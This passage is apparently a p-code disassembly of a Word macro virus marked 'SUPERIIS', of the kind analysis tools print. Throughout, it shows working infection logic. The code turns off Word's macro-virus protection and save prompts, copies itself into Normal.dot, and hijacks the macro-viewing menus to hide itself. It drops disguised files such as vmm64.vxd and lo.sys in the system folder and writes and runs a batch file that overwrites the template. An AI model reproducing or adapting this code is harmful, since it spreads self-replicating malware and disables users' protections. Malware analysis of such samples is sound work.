' 	ExitFor 
' 	EndIf 
' Line #106:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	Ld ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #109:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld fg 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #112:
' 	LitStr 0x0000 ""
' 	St False 
' Line #113:
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #114:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #115:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #116:
' 	StartForVariable 
' 	Ld fg 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Ld fg 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St a 
' Line #119:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld a 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	Label esub 
' Line #122:
' 	CloseAll 
' Line #123:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #124:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #126:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #127:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #128:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Loop 
' Line #131:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #132:
' 	Ld windir 
' 	LitStr 0x000E "\system\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #133:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St x 
' Line #134:
' 	CloseAll 
' Line #135:
' 	LitStr 0x0009 "c:\lo.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #137:
' 	CloseAll 
' Line #138:
' 	LitStr 0x0009 "c:\lo.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #139:
' 	LitDI2 0x0001 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deleteLines 0x0002 
' Line #140:
' 	LitDI2 0x0001 
' 	LitStr 0x0018 "Private Sub ToolsMacro()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #141:
' 	LitDI2 0x0002 
' 	LitStr 0x002D "Application.dialogs (wddialogtoolsmacro).show"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #142:
' 	LitDI2 0x0003 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #143:
' 	Label eb 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Private Sub MakeView())
' Line #146:
' 	OnError eb 
' Line #147:
' 	LitStr 0x0010 "Sub ViewVbCode()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #148:
' 	Ld StealthCode 
' 	LitStr 0x000C "Call Stealth"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #149:
' 	Ld StealthCode 
' 	LitStr 0x0007 "end sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #150:
' 	Ld StealthCode 
' 	LitStr 0x000E "sub ToolsMacro"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #151:
' 	Ld StealthCode 
' 	LitStr 0x000B "Call MacroS"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #152:
' 	Ld StealthCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St StealthCode 
' Line #153:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #154:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #155:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #156:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St False 
' 	EndIf 
' Line #157:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #158:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	Ld False 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "SUB VIEWVBCODE()"
' 	Eq 
' 	IfBlock 
' Line #160:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deleteLines 0x0002 
' Line #161:
' 	Ld StealthCode 
' 	Paren 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #162:
' 	ElseBlock 
' Line #163:
' 	CloseAll 
' Line #164:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #165:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #166:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #167:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #168:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #169:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	Loop 
' Line #172:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #173:
' 	CloseAll 
' Line #174:
' 	Ld windir 
' 	LitStr 0x0011 "\system\losys.exe"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St gg 
' Line #175:
' 	Ld gg 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0011 "\system\losys.exe"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #176:
' 	Ld windir 
' 	LitStr 0x0011 "\System\losys.exe"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld StealthCode 
' 	PrintItemNL 
' Line #179:
' 	CloseAll 
' Line #180:
' 	Ld windir 
' 	LitStr 0x0011 "\System\losys.exe"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	ArgsCall (Call) FileClose 0x0000 
' Line #183:
' 	Label eb 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Sub FileClose())
' Line #186:
' 	OnError eb 
' Line #187:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #188:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #190:
' 	CloseAll 
' Line #191:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #192:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #193:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #194:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #195:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #196:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	Loop 
' Line #199:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #200:
' 	OnError NoInf 
' Line #201:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St a 
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #203:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St ls 
' Line #204:
' 	Ld ls 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St l 
' 	EndIf 
' Line #205:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #206:
' 	LitDI2 0x0001 
' 	St acd 
' Line #207:
' 	ExitFor 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	Ld acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #211:
' 	LitStr 0x000C "Sub AutoExec"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #212:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #213:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #214:
' 	Ld ii 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no2 
' 	EndIf 
' Line #215:
' 	Ld ii 
' 	LitDI2 0x004D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no2 
' 	EndIf 
' Line #216:
' 	Ld ii 
' 	LitDI2 0x00BA 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no2 
' 	EndIf 
' Line #217:
' 	Ld ii 
' 	LitDI2 0x00B7 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no2 
' 	EndIf 
' Line #218:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St l 
' Line #219:
' 	Ld FullCode 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #220:
' 	Label no2 
' Line #221:
' 	Ld ii 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000B "Sub Stealth"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #222:
' 	Ld ii 
' 	LitDI2 0x004D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000A "Sub MacroS"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #223:
' 	Ld ii 
' 	LitDI2 0x00BA 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000D "Sub AutoClose"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #224:
' 	Ld ii 
' 	LitDI2 0x00B7 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000E "Call AutoClose"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #225:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #226:
' 	EndIfBlock 
' Line #227:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St a 
' Line #228:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #229:
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St ls 
' Line #230:
' 	Ld ls 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St l 
' 	EndIf 
' Line #231:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "'MYNAME=SUPERIIS"
' 	Eq 
' 	IfBlock 
' Line #232:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #233:
' 	ExitFor 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #236:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #237:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #238:
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countofLines 
' 	St a 
' Line #239:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #240:
' 	Ld iiii 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo non2 
' 	EndIf 
' Line #241:
' 	Ld iiii 
' 	LitDI2 0x004D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo non2 
' 	EndIf 
' Line #242:
' 	Ld iiii 
' 	LitDI2 0x00BA 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo non2 
' 	EndIf 
' Line #243:
' 	Ld iiii 
' 	LitDI2 0x00B7 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo non2 
' 	EndIf 
' Line #244:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St l 
' Line #245:
' 	Ld FullCode 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #246:
' 	Label non2 
' Line #247:
' 	Ld iiii 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000E "Sub StealthDoc"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #248:
' 	Ld iiii 
' 	LitDI2 0x004D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000D "Sub MacroSDoc"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #249:
' 	Ld iiii 
' 	LitDI2 0x00BA 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000D "Sub FileClose"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #250:
' 	Ld iiii 
' 	LitDI2 0x00B7 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitStr 0x000E "Call FileClose"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' 	EndIf 
' Line #251:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #252:
' 	EndIfBlock 
' Line #253:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #254:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #255:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #256:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #257:
' 	CloseAll 
' Line #258:
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm64.vxd"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St d 
' Line #259:
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm64.vxd"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #260:
' 	Ld windir 
' 	LitStr 0x0011 "\System\Vmm64.vxd"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FullCode 
' 	PrintItemNL 
' Line #263:
' 	CloseAll 
' Line #264:
' 	Ld windir 
' 	LitStr 0x0011 "\System\Vmm64.VXD"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #265:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #266:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #267:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #268:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #269:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #270:
' 	CloseAll 
' Line #271:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #272:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #273:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #274:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "If not exist "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld l 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "~$Normal.dot goto start"
' 	Concat 
' 	PrintItemNL 
' Line #276:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Goto Begin"
' 	PrintItemNL 
' Line #277:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Start"
' 	PrintItemNL 
' Line #278:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #281:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #282:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #283:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #284:
' 	CloseAll 
' Line #285:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #286:
' 	EndIfBlock 
' Line #287:
' 	Ld acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #288:
' 	CloseAll 
' Line #289:
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm64.vxd"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St d 
' Line #290:
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm64.vxd"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #291:
' 	Ld windir 
' 	LitStr 0x0011 "\System\Vmm64.vxd"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #292:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #293:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FullCode 
' 	PrintItemNL 
' Line #294:
' 	CloseAll 
' Line #295:
' 	Ld windir 
' 	LitStr 0x0011 "\System\Vmm64.VXD"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
